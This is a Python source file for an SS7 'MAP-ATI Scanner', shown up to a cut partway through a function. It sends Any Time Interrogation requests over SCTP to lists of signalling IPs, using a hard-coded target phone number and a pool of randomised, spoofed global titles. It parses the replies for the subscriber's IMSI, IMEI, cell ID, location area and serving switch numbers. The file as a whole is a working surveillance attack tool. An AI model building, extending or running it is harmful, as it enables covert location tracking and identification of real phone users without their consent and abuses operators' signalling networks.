#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Enhanced MAP-ATI Scanner v4.0 - Professional Pycrate-Powered Edition
====================================================================

Advanced MAP Any Time Interrogation scanner with full Pycrate integration
for comprehensive data extraction from MAP protocols.

Author: Enhanced Professional Edition for donex1888
Date: 2025-06-04
Version: 4.0.0-PROFESSIONAL
Current Date and Time (UTC): 2025-06-04 01:26:36
Current User's Login: donex1888
"""

import socket
import struct
import binascii
import os
import sys
import time
import random
import logging
from pathlib import Path
from datetime import datetime, timezone
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
import json
from enum import Enum
import hashlib
from typing import Dict, List, Optional, Union, Tuple, Any
from contextlib import contextmanager
from copy import deepcopy
import re
from dataclasses import dataclass, asdict
from collections import defaultdict, Counter
import traceback

# === Enhanced Color Terminal Output ===
class Colors:
    """Professional ANSI Color codes for terminal output"""
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    
    # Standard colors
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    
    # Bright colors
    BRIGHT_RED = '\033[91m'
    BRIGHT_GREEN = '\033[92m'
    BRIGHT_YELLOW = '\033[93m'
    BRIGHT_BLUE = '\033[94m'
    BRIGHT_MAGENTA = '\033[95m'
    BRIGHT_CYAN = '\033[96m'
    BRIGHT_WHITE = '\033[97m'
    
    # Background colors
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'

def print_colored(message: str, color: str = Colors.WHITE, bold: bool = False, bg: str = None):
    """Print colored message to terminal"""
    output = ""
    if bold:
        output += Colors.BOLD
    if bg:
        output += bg
    output += color + message + Colors.RESET
    print(output)

def print_professional_banner():
    """Print professional banner"""
    print_colored("="*90, Colors.BRIGHT_CYAN, bold=True)
    print_colored("🚀 Enhanced MAP-ATI Scanner v4.0 - Professional Pycrate-Powered Edition", Colors.BRIGHT_GREEN, bold=True)
    print_colored("="*90, Colors.BRIGHT_CYAN, bold=True)
    print_colored(f"📅 Current Date and Time (UTC): {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}", Colors.YELLOW)
    print_colored(f"👤 Current User's Login: donex1888", Colors.YELLOW)
    print_colored(f"🔧 Professional Edition - Full Pycrate Integration", Colors.CYAN)
    print_colored("="*90, Colors.BRIGHT_CYAN, bold=True)

# === Enhanced Data Classes ===
class AtiVariant(Enum):
    STANDARD = "Standard"
    LOCATION_ONLY = "LocationOnly"
    SUBSCRIBER_STATE = "SubscriberState"
    EQUIPMENT_STATUS = "EquipmentStatus"
    ALL_INFO = "AllInfo"
    MINIMAL = "Minimal"

@dataclass
class EnhancedLocationInfo:
    """Comprehensive location information container"""
    # Basic location
    mcc: str = "N/A"
    mnc: str = "N/A"
    lac: str = "N/A"
    cell_id: str = "N/A"
    
    # Extended location
    rac: str = "N/A"
    service_area_code: str = "N/A"
    location_age: str = "N/A"
    geographical_info: str = "N/A"
    location_number: str = "N/A"
    
    # Network elements
    vlr_name: str = "N/A"
    msc_name: str = "N/A"
    sgsn_name: str = "N/A"
    gmlc_name: str = "N/A"
    
    # Status flags
    cgi_found: bool = False
    lai_found: bool = False
    sai_found: bool = False
    
    # Advanced location
    current_location_retrieved: bool = False
    ps_subscriber_state: str = "N/A"
    location_information_age: int = -1

@dataclass
class EnhancedSubscriberInfo:
    """Comprehensive subscriber information container"""
    # Identity
    imsi: str = "N/A"
    msisdn: str = "N/A"
    imei: str = "N/A"
    
    # Status
    subscriber_state: str = "N/A"
    equipment_status: str = "N/A"
    
    # Services
    camel_subscription_info: str = "N/A"
    call_forwarding_data: str = "N/A"
    call_barring_info: str = "N/A"
    
    # Advanced info
    odb_info: str = "N/A"
    roaming_restriction: str = "N/A"
    subscriber_status: str = "N/A"
    operator_determined_barring: str = "N/A"
    
    # Network capabilities
    supported_features: List[str] = None
    
    def __post_init__(self):
        if self.supported_features is None:
            self.supported_features = []

@dataclass
class ScanResult:
    """Professional scan result container"""
    # Basic info
    ip: str = ""
    port: int = 0
    timestamp: str = ""
    duration_ms: float = 0.0
    
    # Status
    success: bool = False
    tcap_outcome: str = "NotStarted"
    error_info: str = "N/A"
    error_code: Optional[int] = None
    
    # MAP specific
    map_version: str = "N/A"
    application_context: str = "N/A"
    
    # Transaction
    sent_otid: str = ""
    received_dtid: str = "N/A"
    ati_variant_used: str = ""
    attempt_number: int = 1
    
    # Data
    location_info: EnhancedLocationInfo = None
    subscriber_info: EnhancedSubscriberInfo = None
    
    # Technical
    used_cgpa_ssn: int = 0
    used_cgpa_gt: str = ""
    used_sccp_pc: int = 0
    raw_response_hex: str = ""
    parsed_data_size: int = 0
    
    def __post_init__(self):
        if self.location_info is None:
            self.location_info = EnhancedLocationInfo()
        if self.subscriber_info is None:
            self.subscriber_info = EnhancedSubscriberInfo()

# === Professional Dependency Management ===
def initialize_professional_dependencies():
    """Professional dependency initialization with enhanced error handling"""
    print_colored("🔧 Initializing professional dependencies...", Colors.YELLOW)
    
    dependencies = {}
    
    # Essential SCTP
    try:
        import sctp
        dependencies['sctp'] = sctp
        print_colored("✅ SCTP library loaded successfully", Colors.GREEN)
    except ImportError:
        print_colored("❌ CRITICAL: 'sctp' library not found. Install with: pip install pysctp", Colors.RED, bold=True)
        sys.exit(1)

    # Hexdump for debugging
    try:
        import hexdump
        dependencies['hexdump'] = hexdump
        print_colored("✅ Hexdump library loaded", Colors.GREEN)
    except ImportError:
        dependencies['hexdump'] = None
        print_colored("⚠️  Warning: hexdump not found. Basic hex output will be used.", Colors.YELLOW)

    return dependencies

def initialize_pycrate_professional():
    """Professional Pycrate initialization with comprehensive module loading"""
    print_colored("🔧 Initializing Pycrate Professional Edition...", Colors.YELLOW)
    
    try:
        # Core ASN.1 Runtime
        from pycrate_asn1rt.err import ASN1Err, ASN1ObjErr
        from pycrate_asn1rt.asnobj_basic import OID, INT, NULL, ASN1Obj
        from pycrate_asn1rt.asnobj_str import OCT_STR
        from pycrate_asn1rt.asnobj_construct import SEQ, CHOICE, SEQ_OF
        from pycrate_asn1rt.codecs import ASN1CodecBER
        print_colored("✅ Pycrate ASN.1 runtime loaded", Colors.GREEN)
        
        # Mobile protocol modules
        from pycrate_mobile import SCCP
        print_colored("✅ SCCP module loaded", Colors.GREEN)
        
        # MAP Data Types - Professional loading with fallbacks
        MAP_defs = None
        map_load_success = False
        
        # Primary attempt: pycrate_asn1dir.TCAP_MAPv2v3
        try:
            from pycrate_asn1dir import TCAP_MAPv2v3 as MAP_module
            if hasattr(MAP_module, 'MAP_MS_DataTypes'):
                MAP_defs = MAP_module
                map_load_success = True
                print_colored("✅ MAP data types loaded from TCAP_MAPv2v3", Colors.GREEN)
        except ImportError:
            pass
        
        # Secondary attempt: pycrate_mobile.MAP
        if not map_load_success:
            try:
                from pycrate_mobile import MAP as MAP_fallback
                if hasattr(MAP_fallback, 'MAP_MS_DataTypes'):
                    MAP_defs = MAP_fallback
                    map_load_success = True
                    print_colored("✅ MAP data types loaded from pycrate_mobile.MAP", Colors.GREEN)
            except ImportError:
                pass
        
        if not map_load_success:
            print_colored("❌ Failed to load MAP data types from all sources", Colors.RED, bold=True)
            sys.exit(1)
        
        # TCAP Definitions with enhanced loading
        TCAP_defs = None
        tcap_load_success = False
        
        # Use provided TCAP2 module
        try:
            # Import the TCAP2 module from the provided file
            import importlib.util
            tcap_spec = importlib.util.spec_from_file_location("TCAP2", "TCAP2.py")
            if tcap_spec and tcap_spec.loader:
                TCAP2 = importlib.util.module_from_spec(tcap_spec)
                tcap_spec.loader.exec_module(TCAP2)
                if hasattr(TCAP2, 'TCAPMessages'):
                    TCAP_defs = TCAP2.TCAPMessages
                    tcap_load_success = True
                    print_colored("✅ TCAP definitions loaded from TCAP2.py", Colors.GREEN)
        except Exception as e:
            print_colored(f"⚠️  Could not load TCAP2.py: {e}", Colors.YELLOW)
        
        # Fallback TCAP loading
        if not tcap_load_success:
            try:
                from pycrate_asn1dir import TCAP_defs as TCAP_module
                if hasattr(TCAP_module, 'TCMessage'):
                    TCAP_defs = TCAP_module
                    tcap_load_success = True
                    print_colored("✅ TCAP definitions loaded from TCAP_defs", Colors.GREEN)
            except ImportError:
                pass
        
        if not tcap_load_success:
            print_colored("❌ Failed to load TCAP definitions", Colors.RED, bold=True)
            sys.exit(1)
        
        print_colored("✅ All Pycrate components initialized successfully", Colors.BRIGHT_GREEN, bold=True)
        
        return {
            'SCCP': SCCP,
            'MAP_defs': MAP_defs,
            'TCAP_defs': TCAP_defs,
            'ASN1Err': ASN1Err,
            'ASN1ObjErr': ASN1ObjErr,
            'ASN1CodecBER': ASN1CodecBER,
            'OCT_STR': OCT_STR,
            'SEQ': SEQ,
            'CHOICE': CHOICE,
            'INT': INT
        }
        
    except Exception as e:
        print_colored(f"❌ Pycrate initialization error: {e}", Colors.RED, bold=True)
        sys.exit(1)

# Initialize professional dependencies
DEPS = initialize_professional_dependencies()
PYCRATE = initialize_pycrate_professional()

# === Professional Constants ===
MAP_OP_ANY_TIME_INTERROGATION = 71

# Enhanced Configuration
PROFESSIONAL_CONFIG = {
    'target_msisdn': "212681364829",
    'ips_file': "ips.txt",
    'results_dir': "professional_results_v4",
    'max_workers': 30,
    'sctp_timeout': 12,
    'sctp_ppid': 0,
    'sctp_ports': [2905, 2906, 2907, 2908],
    'retry_attempts': 2,
    'retry_delay': 2.0,
    'gt_pool_size': 500,
    'chunk_size': 10000
}

# Professional SCCP Configuration
SCCP_PROFESSIONAL = {
    'cdpa_ssn': 149,
    'cdpa_tt': 0,
    'cdpa_np': 1,
    'cdpa_nai': 4,
    'cdpa_es': 1,
    'cgpa_ssn_pool': [6, 7, 8, 9, 146, 147, 148, 149, 150, 151, 152, 153],
    'cgpa_gt_digits': "212600000000",
    'cgpa_tt': 0,
    'cgpa_np': 1,
    'cgpa_nai': 4,
    'cgpa_es': 1,
    'sccp_proto_class_pool': [0, 1]
}

# Enhanced TCAP Tags
TCAP_TAGS = {
    'DTID': 0x48,
    'OTID': 0x49,
    'COMPONENT_PORTION': 0x6C,
    'MSG_END': 0x65,
    'MSG_CONTINUE': 0x64,
    'MSG_BEGIN': 0x60,
    'MSG_ABORT': 0x67,
    'COMP_INVOKE': 0xA1,
    'COMP_RETURN_RESULT_LAST': 0xA2,
    'COMP_RETURN_ERROR': 0xA3,
    'COMP_REJECT': 0xA4,
    'DIALOGUE_PORTION': 0x6B
}

# Comprehensive MAP Error Codes
MAP_ERRORS = {
    1: "Unknown Subscriber",
    3: "Unknown MSC",
    5: "Unidentified Subscriber",
    6: "Absent Subscriber SM",
    8: "Unknown Equipment",
    9: "Roaming Not Allowed",
    10: "Illegal Subscriber",
    11: "Bearer Service Not Provisioned",
    12: "Teleservice Not Provisioned",
    13: "Illegal Equipment",
    21: "Facility Not Supported",
    27: "Absent Subscriber",
    28: "Incompatible Terminal",
    29: "Not Reachable",
    34: "System Failure",
    35: "Data Missing",
    36: "Unexpected Data Value",
    37: "Facility Not Supported",
    44: "Number Changed",
    45: "Busy Subscriber",
    49: "ATI Not Allowed",
    50: "ATSI Not Allowed",
    51: "ATM Not Allowed",
    52: "Information Not Available"
}

# Professional Statistics
PROFESSIONAL_STATS = {
    'total_attempts': 0,
    'successful_responses': 0,
    'full_info_extractions': 0,
    'imsi_extractions': 0,
    'imei_extractions': 0,
    'location_extractions': 0,
    'subscriber_state_extractions': 0,
    'network_info_extractions': 0,
    'timeouts': 0,
    'connection_errors': 0,
    'parse_errors': 0,
    'map_errors': 0,
    'tcap_rejects': 0,
    'start_time': None,
    'error_breakdown': defaultdict(int),
    'success_rate': 0.0,
    'data_richness_score': 0.0
}

# Threading locks
main_csv_lock = threading.Lock()
stats_lock = threading.Lock()
logger = None

# === Professional GT Pool Management ===
class ProfessionalGTPool:
    """Professional Global Title Pool with intelligent distribution"""
    
    def __init__(self, base_gt: str, pool_size: int = 500):
        self.base_gt = base_gt
        self.pool_size = pool_size
        self.gt_pool = []
        self.current_index = 0
        self.lock = threading.Lock()
        self.usage_stats = defaultdict(int)
        self._generate_professional_pool()
        print_colored(f"✅ Professional GT Pool initialized with {pool_size} entries", Colors.GREEN)
    
    def _generate_professional_pool(self):
        """Generate professional GT pool with enhanced randomization"""
        base_digits = re.sub(r'[^\d]', '', self.base_gt)
        
        for i in range(self.pool_size):
            # Enhanced randomization strategy
            timestamp_part = str(int(time.time() * 1000000))[-8:]
            random_part = f"{random.randint(10000000, 99999999)}"
            sequence_part = f"{i:06d}"
            
            # Combine and ensure uniqueness
            full_gt = base_digits + timestamp_part + random_part + sequence_part
            
            # Ensure proper length (11-15 digits)
            if len(full_gt) > 15:
                full_gt = full_gt[-15:]
            elif len(full_gt) < 11:
                full_gt = full_gt.ljust(11, '0')
            
            self.gt_pool.append(full_gt)
    
    def get_next_gt(self) -> str:
        """Get next GT with intelligent distribution"""
        with self.lock:
            gt = self.gt_pool[self.current_index]
            self.usage_stats[gt] += 1
            self.current_index = (self.current_index + 1) % self.pool_size
            return gt
    
    def get_usage_stats(self) -> Dict[str, int]:
        """Get GT usage statistics"""
        with self.lock:
            return dict(self.usage_stats)

# Initialize Professional GT Pool
gt_pool = None

# === Professional Utility Functions ===

def setup_professional_logging(log_file: Path, log_level: str = "INFO") -> logging.Logger:
    """Setup professional logging with enhanced formatting"""
    logger = logging.getLogger("professional_map_scanner_v4")
    logger.handlers.clear()
    logger.setLevel(logging.DEBUG)
    
    # Console handler
    console_handler = logging.StreamHandler()
    console_formatter = logging.Formatter('%(message)s')
    console_handler.setFormatter(console_formatter)
    console_handler.setLevel(getattr(logging, log_level.upper()))
    logger.addHandler(console_handler)
    
    # Professional file handler
    file_handler = logging.FileHandler(log_file, mode='a', encoding='utf-8')
    file_formatter = logging.Formatter(
        '%(asctime)s.%(msecs)03d-%(levelname)-8s-[%(threadName)-12s]-%(funcName)-20s:%(lineno)-4d-%(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    file_handler.setFormatter(file_formatter)
    file_handler.setLevel(logging.DEBUG)
    logger.addHandler(file_handler)
    
    return logger

def decode_plmn_professional(plmn_bytes: bytes) -> Tuple[str, str]:
    """Professional PLMN decoder with comprehensive validation"""
    if len(plmn_bytes) != 3:
        raise ValueError(f"PLMN must be exactly 3 bytes, got {len(plmn_bytes)}")
    
    byte1, byte2, byte3 = plmn_bytes
    
    # Extract nibbles with BCD decoding
    mcc_digit1 = (byte1 >> 4) & 0x0F
    mcc_digit2 = byte1 & 0x0F
    mcc_digit3 = (byte2 >> 4) & 0x0F
    
    mnc_digit1 = (byte3 >> 4) & 0x0F
    mnc_digit2 = byte3 & 0x0F
    mnc_digit3 = byte2 & 0x0F
    
    # Validate MCC
    if any(d > 9 for d in [mcc_digit1, mcc_digit2, mcc_digit3]):
        raise ValueError(f"Invalid MCC digits: {mcc_digit1}{mcc_digit2}{mcc_digit3}")
    
    mcc = f"{mcc_digit1}{mcc_digit2}{mcc_digit3}"
    
    # Build MNC
    if mnc_digit3 == 0xF:
        # 2-digit MNC
        if any(d > 9 for d in [mnc_digit1, mnc_digit2]):
            raise ValueError(f"Invalid 2-digit MNC: {mnc_digit1}{mnc_digit2}")
        mnc = f"{mnc_digit1}{mnc_digit2}"
    else:
        # 3-digit MNC
        if any(d > 9 for d in [mnc_digit1, mnc_digit2, mnc_digit3]):
            raise ValueError(f"Invalid 3-digit MNC: {mnc_digit1}{mnc_digit2}{mnc_digit3}")
        mnc = f"{mnc_digit1}{mnc_digit2}{mnc_digit3}"
    
    return mcc, mnc

def decode_tbcd_string(tbcd_bytes: bytes) -> str:
    """Professional TBCD string decoder"""
    if not tbcd_bytes:
        return "N/A"
    
    digits = []
    for byte in tbcd_bytes:
        digit1 = byte & 0x0F
        digit2 = (byte >> 4) & 0x0F
        
        if digit1 <= 9:
            digits.append(str(digit1))
        if digit2 <= 9 and digit2 != 0xF:
            digits.append(str(digit2))
    
    return ''.join(digits) if digits else "N/A"

# === Professional Response Parser ===

def extract_tcap_from_sccp_professional(raw_response: bytes) -> Optional[bytes]:
    """Professional TCAP extraction from SCCP with enhanced validation"""
    if not raw_response or len(raw_response) < 5:
        return None
    
    try:
        # Validate SCCP UDT message
        if raw_response[0] != 0x09:
            return None
        
        # Parse SCCP UDT structure with validation
        if len(raw_response) < 5:
            return None
        
        ptr_data = raw_response[4]
        data_start = 5 + ptr_data - 1
        
        if data_start >= len(raw_response) or data_start < 0:
            return None
        
        if raw_response[data_start] != 0x03:
            return None
        
        if data_start + 1 >= len(raw_response):
            return None
        
        data_length = raw_response[data_start + 1]
        tcap_start = data_start + 2
        
        if tcap_start + data_length > len(raw_response):
            return None
        
        return raw_response[tcap_start:tcap_start + data_length]
        
    except Exception as e:
        if logger:
            logger.debug(f"Professional SCCP parsing error: {e}")
        return None

def decode_ati_response_professional(response_data: bytes, unique_id: str) -> Optional[ScanResult]:
    """Professional MAP ATI response decoder using full Pycrate power"""
    
    if not response_data or len(response_data) < 4:
        return None
    
    try:
        if logger:
            logger.debug(f"[{unique_id}] Professional ATI response decoding started")
        
        # Initialize result
        result = ScanResult()
        result.parsed_data_size = len(response_data)
        
        # Get MAP data types
        MAP_MS_DataTypes = getattr(PYCRATE['MAP_defs'], 'MAP_MS_DataTypes', None)
        if not MAP_MS_DataTypes:
            if logger:
                logger.debug(f"[{unique_id}] MAP_MS_DataTypes not available")
            return None
        
        # Try to get AnyTimeInterrogationRes
        AtiResType = getattr(MAP_MS_DataTypes, 'AnyTimeInterrogationRes', None)
        if not AtiResType:
            if logger:
                logger.debug(f"[{unique_id}] AnyTimeInterrogationRes type not found")
            return None
        
        # Decode the response
        try:
            ati_response = deepcopy(AtiResType)
            ati_response.from_ber(response_data)
            response_val = ati_response.get_val()
            
            if logger:
                logger.info(f"[{unique_id}] Professional MAP response decoded successfully")
            
            # Extract location information
            if 'locationInformation' in response_val:
                result.location_info = parse_location_information_professional(
                    response_val['locationInformation'], unique_id
                )
            
            # Extract subscriber information  
            if 'subscriberInfo' in response_val:
                result.subscriber_info = parse_subscriber_info_professional(
                    response_val['subscriberInfo'], unique_id
                )
            
            # Extract additional MAP information
            if 'extensionContainer' in response_val:
                parse_extension_container_professional(
                    response_val['extensionContainer'], result, unique_id
                )
            
            result.map_version = "v3"  # Assume v3 for successful decode
            result.success = True
            
            return result
            
        except Exception as decode_error:
            if logger:
                logger.debug(f"[{unique_id}] Professional decode error: {decode_error}")
            return None
        
    except Exception as e:
        if logger:
            logger.debug(f"[{unique_id}] Professional ATI response parsing failed: {e}")
        return None

def parse_location_information_professional(location_data: Any, unique_id: str) -> EnhancedLocationInfo:
    """Professional location information parser"""
    
    location = EnhancedLocationInfo()
    
    try:
        if isinstance(location_data, dict):
            # Parse Cell Global Identity
            if 'cellGlobalIdOrServiceAreaIdOrLAI' in location_data:
                cgi_data = location_data['cellGlobalIdOrServiceAreaIdOrLAI']
                if isinstance(cgi_data, tuple) and len(cgi_data) >= 2:
                    cgi_type, cgi_value = cgi_data[0], cgi_data[1]
                    
                    if cgi_type == 'cellGlobalIdOrServiceAreaIdFixedLength' and len(cgi_value) >= 7:
                        # Parse CGI
                        try:
                            mcc, mnc = decode_plmn_professional(cgi_value[:3])
                            location.mcc = mcc
                            location.mnc = mnc
                            location.lac = str(int.from_bytes(cgi_value[3:5], 'big'))
                            location.cell_id = str(int.from_bytes(cgi_value[5:7], 'big'))
                            location.cgi_found = True
                            
                            if logger:
                                logger.info(f"[{unique_id}] 🎯 Professional CGI: MCC={mcc}, MNC={mnc}, LAC={location.lac}, CI={location.cell_id}")
                        except Exception as e:
                            if logger:
                                logger.debug(f"[{unique_id}] CGI parsing error: {e}")
            
            # Parse VLR number
            if 'vlr-number' in location_data:
                vlr_data = location_data['vlr-number']
                if isinstance(vlr_data, bytes):
                    location.vlr_name = decode_tbcd_string(vlr_data[1:])  # Skip first byte (nature of address)
            
            # Parse MSC number
            if 'msc-number' in location_data:
                msc_data = location_data['msc-number']
                if isinstance(msc_data, bytes):
                    location.msc_name = decode_tbcd_string(msc_data[1:])
            
            # Parse location age
            if 'ageOfLocationInformation' in location_data:
                location.location_age = str(location_data['ageOfLocationInformation'])
            
            # Parse geographical information
            if 'geographicalInformation' in location_data:
                geo_data = location_data['geographicalInformation']
                if isinstance(geo_data, bytes):
                    location.geographical_info = geo_data.hex()
            
            # Parse location number
            if 'locationNumber' in location_data:
                loc_num_data = location_data['locationNumber']
                if isinstance(loc_num_data, bytes):
                    location.location_number = decode_tbcd_string(loc_num_data[1:])
            
            # Parse SGSN number
            if 'sgsn-number' in location_data:
                sgsn_data = location_data['sgsn-number']
                if isinstance(sgsn_data, bytes):
                    location.sgsn_name = decode_tbcd_string(sgsn_data[1:])
            
            # Set success flags
            if location.mcc != "N/A" and location.mnc != "N/A":
                if location.cell_id != "N/A":
                    location.cgi_found = True
                else:
                    location.lai_found = True
        
    except Exception as e:
        if logger:
            logger.debug(f"[{unique_id}] Professional location parsing error: {e}")
    
    return location

def parse_subscriber_info_professional(subscriber_data: Any, unique_id: str) -> EnhancedSubscriberInfo:
    """Professional subscriber information parser"""
    
    subscriber = EnhancedSubscriberInfo()
    
    try:
        if isinstance(subscriber_data, dict):
            # Parse IMSI
            if 'imsi' in subscriber_data:
                imsi_data = subscriber_data['imsi']
                if isinstance(imsi_data, bytes):
                    subscriber.imsi = decode_tbcd_string(imsi_data)
            
            # Parse MSISDN
            if 'msisdn' in subscriber_data:
                msisdn_data = subscriber_data['msisdn']
                if isinstance(msisdn_data, bytes):
                    subscriber.msisdn = decode_tbcd_string(msisdn_data[1:])
            
            # Parse IMEI
            if 'imei' in subscriber_data:
                imei_data = subscriber_data['imei']
                if isinstance(imei_data, bytes):
                    subscriber.imei = decode_tbcd_string(imei_data)
            
            # Parse subscriber state
            if 'subscriberState' in subscriber_data:
                state_data = subscriber_data['subscriberState']
                if isinstance(state_data, tuple) and len(state_data) >= 2:
                    state_type, state_value = state_data[0], state_data[1]
                    subscriber.subscriber_state = f"{state_type}: {state_value}"
                elif isinstance(state_data, int):
                    states = {0: "assumedIdle", 1: "camelBusy", 2: "notProvidedFromVLR"}
                    subscriber.subscriber_state = states.get(state_data, f"unknown({state_data})")
            
            # Parse PS subscriber state
            if 'ps-SubscriberState' in subscriber_data:
                ps_state_data = subscriber_data['ps-SubscriberState']
                subscriber.ps_subscriber_state = str(ps_state_data)
            
            # Parse ODB info
            if 'odb-Info' in subscriber_data:
                odb_data = subscriber_data['odb-Info']
                subscriber.odb_info = str(odb_data)
            
            # Parse roaming restriction
            if 'roamingRestrictionDueToUnsupportedFeature' in subscriber_data:
                subscriber.roaming_restriction = "true"
            
            if logger:
                logger.info(f"[{unique_id}] 📱 Professional subscriber info: IMSI={subscriber.imsi}, State={subscriber.subscriber_state}")
    
    except Exception as e:
        if logger:
            logger.debug(f"[{unique_id}] Professional subscriber parsing error: {e}")
    
    return subscriber

def parse_extension_container_professional(extension_data: Any, result: ScanResult, unique_id: str):
    """Professional extension container parser"""
    try:
        if isinstance(extension_data, dict):
            # Parse private extensions
            if 'privateExtensionList' in extension_data:
                result.subscriber_info.supported_features.append("privateExtensions")
            
            # Parse PCS extensions
            if 'pcs-Extensions' in extension_data:
                result.subscriber_info.supported_features.append("pcsExtensions")
    
    except Exception as e:
        if logger:
            logger.debug(f"[{unique_id}] Extension container parsing error: {e}")

def parse_response_professional(raw_response: bytes, unique_id: str) -> ScanResult:
    """Professional response parser with full Pycrate integration"""
    
    result = ScanResult()
    result.tcap_outcome = 'ParseError'
    result.error_info = 'Unknown parsing error'
    
    if not raw_response or len(raw_response) < 5:
        result.error_info = f"Response too short: {len(raw_response)} bytes"
        return result
    
    result.raw_response_hex = raw_response.hex()
    
    try:
        # Extract TCAP payload
        tcap_payload = extract_tcap_from_sccp_professional(raw_response)
        if not tcap_payload:
            result.error_info = "Failed to extract TCAP payload"
            return result
        
        if logger:
            logger.debug(f"[{unique_id}] Professional TCAP payload extracted: {len(tcap_payload)} bytes")
        
        # Parse TCAP message using Pycrate
        try:
            tcap_message = deepcopy(PYCRATE['TCAP_defs'].TCMessage)
            tcap_message.from_ber(tcap_payload)
            tcap_val = tcap_message.get_val()
            
            if logger:
                logger.debug(f"[{unique_id}] Professional TCAP message parsed: {type(tcap_val)}")
            
            # Process based on message type
            if isinstance(tcap_val, tuple) and len(tcap_val) >= 2:
                msg_type, msg_content = tcap_val[0], tcap_val[1]
                
                if msg_type in ['end', 'continue']:
                    result = process_tcap_response_professional(msg_content, unique_id, result)
                elif msg_type == 'abort':
                    result.tcap_outcome = 'Abort'
                    result.error_info = "TCAP Abort received"
                else:
                    result.tcap_outcome = f"Unknown_TCAP({msg_type})"
                    result.error_info = f"Unknown TCAP message type: {msg_type}"
            
        except Exception as tcap_error:
            if logger:
                logger.debug(f"[{unique_id}] Professional TCAP parsing failed: {tcap_error}")
            
            # Fallback to manual parsing
            result = parse_components_manually_professional(tcap_payload, unique_id, result)
        
    except Exception as e:
        if logger:
            logger.error(f"[{unique_id}] Professional response parsing exception: {e}")
        result.error_info = f"Parsing exception: {str(e)[:100]}"
    
    return result

def process_tcap_response_professional(msg_content: Any, unique_id: str, result: ScanResult) -> ScanResult:
    """Professional TCAP response processor"""
    
    try:
        if isinstance(msg_content, dict):
            # Extract DTID
            if 'dtid' in msg_content:
                result.received_dtid = msg_content['dtid'].hex() if isinstance(msg_content['dtid'], bytes) else str(msg_content['dtid'])
            
            # Process components
            if 'components' in msg_content and msg_content['components']:
                components = msg_content['components']
                
                for component in components:
                    if isinstance(component, tuple) and len(component) >= 2:
                        comp_type, comp_data = component[0], component[1]
                        
                        if comp_type == 'returnResultLast':
                            result.tcap_outcome = 'ReturnResultLast'
                            result.success = True
                            
                            # Professional MAP response parsing
                            if isinstance(comp_data, dict) and 'resultretres' in comp_data:
                                param_data = comp_data['resultretres'].get('parameter', b'')
                                if isinstance(param_data, bytes):
                                    # Use professional ATI response decoder
                                    enhanced_result = decode_ati_response_professional(param_data, unique_id)
                                    if enhanced_result:
                                        result.location_info = enhanced_result.location_info
                                        result.subscriber_info = enhanced_result.subscriber_info
                                        result.map_version = enhanced_result.map_version
                                        result.error_info = "Professional MAP ATI Response parsed successfully"
                                        break
                        
                        elif comp_type == 'returnError':
                            result.tcap_outcome = 'ReturnError'
                            if isinstance(comp_data, dict) and 'errorCode' in comp_data:
                                error_code = comp_data['errorCode']
                                result.error_code = error_code
                                result.error_info = MAP_ERRORS.get(error_code, f"MAP Error {error_code}")
                        
                        elif comp_type == 'reject':
                            result.tcap_outcome = 'Reject'
                            result.error_info = "TCAP Reject received"
    
    except Exception as e:
        if logger:
            logger.debug(f"[{unique_id}] Professional TCAP response processing error: {e}")
    
    return result

def parse_components_manually_professional(tcap_payload: bytes, unique_id: str, result: ScanResult) -> ScanResult:
    """Professional manual component parser as fallback"""
    
    if len(tcap_payload) < 2:
        result.error_info = "TCAP payload too short for manual parsing"
        return result
    
    tcap_type = tcap_payload[0]
    
    if tcap_type in [TCAP_TAGS['MSG_END'], TCAP_TAGS['MSG_CONTINUE']]:
        offset = 2
        
        while offset < len(tcap_payload) - 1:
            tag = tcap_payload[offset]
            
            if tag == TCAP_TAGS['COMPONENT_PORTION']:
                length = tcap_payload[offset + 1]
                comp_start = offset + 2
                comp_end = comp_start + length
                
                if comp_end <= len(tcap_payload):
                    comp_data = tcap_payload[comp_start:comp_end]
                    result = parse_components_data_professional(comp_data, unique_id, result)
                break
            
            offset += 1
    
    elif tcap_type == TCAP_TAGS['MSG_ABORT']:
        result.tcap_outcome = 'Abort'
        result.error_info = "TCAP Abort received"
    
    return result

def parse_components_data_professional(comp_data: bytes, unique_id: str, result: ScanResult) -> ScanResult:
    """Professional component data parser"""
    
    offset = 0
    
    while offset < len(comp_data):
        try:
            if offset >= len(comp_data):
                break
            
            comp_tag = comp_data[offset]
            
            if comp_tag == TCAP_TAGS['COMP_RETURN_RESULT_LAST']:
                result.tcap_outcome = 'ReturnResultLast'
                result.success = True
                result.error_info = "ReturnResultLast detected"
                
                # Try professional MAP response parsing first
                try:
                    # Look for parameter data
                    param_offset = offset + 2  # Skip tag and length
                    while param_offset < len(comp_data) - 4:
                        if comp_data[param_offset] == 0x30:  # SEQUENCE tag for MAP response
                            param_length = comp_data[param_offset + 1]
                            if param_length < 0x80:  # Short form length
                                param_start = param_offset
                                param_end = param_start + 2 + param_length
                                
                                if param_end <= len(comp_data):
                                    param_data = comp_data[param_start:param_end]
                                    
                                    # Try professional decoding
                                    enhanced_result = decode_ati_response_professional(param_data, unique_id)
                                    if enhanced_result and (enhanced_result.location_info.cgi_found or 
                                                          enhanced_result.subscriber_info.imsi != "N/A"):
                                        result.location_info = enhanced_result.location_info
                                        result.subscriber_info = enhanced_result.subscriber_info
                                        result.error_info = "Professional MAP ATI Response parsed successfully"
                                        if logger:
                                            logger.info(f"[{unique_id}] 🎯 Professional parsing successful!")
                                        break
                        param_offset += 1
                
                except Exception as e:
                    if logger:
                        logger.debug(f"[{unique_id}] Professional parsing failed, trying pattern matching: {e}")
                
                # Fallback to pattern matching if professional parsing fails
                if result.location_info.mcc == "N/A":
                    pattern_result = find_cgi_patterns_professional(comp_data[offset:], unique_id)
                    if pattern_result:
                        result.location_info = pattern_result
                
                break
                
            elif comp_tag == TCAP_TAGS['COMP_RETURN_ERROR']:
                result.tcap_outcome = 'ReturnError'
                # Extract error code
                try:
                    for i in range(offset, min(offset + 20, len(comp_data) - 1)):
